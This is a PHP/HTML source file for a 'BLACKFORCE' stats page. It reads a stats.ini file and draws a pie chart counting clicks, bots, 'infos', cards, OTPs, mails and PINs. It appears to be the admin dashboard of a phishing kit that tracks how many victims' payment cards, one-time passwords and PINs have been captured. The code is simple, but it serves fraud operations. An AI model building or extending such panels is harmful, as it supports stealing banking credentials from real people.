<?php

$filepath = 'stats.ini';
$data = @parse_ini_file($filepath);

?>
<!DOCTYPE html>
<html>
<head>
    <title>STATS | BLACKFORCE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="../assets/favicon.ico" type="image/x-icon">
    <script src="https://cdn.amcharts.com/lib/4/core.js"></script>
    <script src="https://cdn.amcharts.com/lib/4/charts.js"></script>
    <script src="https://cdn.amcharts.com/lib/4/themes/animated.js"></script>
    <style>
        body {
            box-sizing: border-box;
            width: 100%;
            font-family: 'Courier New', monospace;
            margin: 0;
            background-color: #fff;
            color: limegreen;
            padding: 0;
        }
        header {
            height: 80px;
            width: 100%;
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            border-bottom: 3px solid limegreen;
            margin-bottom: 30px;
            background-color: #000;
        }
        #chartdiv {
            width: 100%;
            height: 60vh;
            margin: 0;
        }
        #legend {
            width: 100%;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            padding: 10px 0;
        }
        .legend-item {
            width: 250px;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: space-between;
            
        }
        .legend-marker {
            width: 12px;
            height: 12px;            
        }
        .legend-value {
            width: 50%;
            display: flex!important;
            flex-direction: row!important;
            align-items: center!important;
            justify-content: space-between!important;
            
        }
    </style>
</head>
<body>
    <header>
    <img style="width: 170px;" src="../assets/blackforce.png" alt="">
    </header>
    <div id="chartdiv"></div>
    <div id="legend"></div>
    <script>
        am4core.useTheme(am4themes_animated);

        var chart = am4core.create("chartdiv", am4charts.PieChart);
        chart.data = [
            {
                "country": "Clicks",
                "litres": <?= $data['clicks'] ?>
            },
            {
                "country": "Bot",
                "litres": <?= $data['bots'] ?>
            },
            {
                "country": "Infos",
                "litres": <?= $data['infos'] ?>
            },
            {
                "country": "Cards",
                "litres": <?= $data['cards'] ?>
            }
            ,
            {
                "country": "Otps",
                "litres": <?= $data['otps'] ?>
            }
            ,
            {
                "country": "Mails",
                "litres": <?= $data['mails'] ?>
            }
            ,
            {
                "country": "Pins",
                "litres": <?= $data['pins'] ?>
            }
        ];

        var pieSeries = chart.series.push(new am4charts.PieSeries());
        pieSeries.dataFields.value = "litres";
        pieSeries.dataFields.category = "country";
        pieSeries.labels.template.disabled = true;
        chart.radius = am4core.percent(95);

        chart.events.on("ready", function (event) {
            var legend = document.getElementById('legend');
            pieSeries.dataItems.each(function (row, i) {
                var color = chart.colors.getIndex(i);
                var percent = Math.round(row.values.value.percent * 100) / 100;
                var value = row.value;
                legend.innerHTML += '<div class="legend-item" style="color: ' + color + '"><div class="legend-marker" style="background: ' + color + '"></div>' + row.category + '<div class="legend-value">' + value + ' | ' + percent + '%</div></div>';
            });
        });
    </script>
</body>
</html>

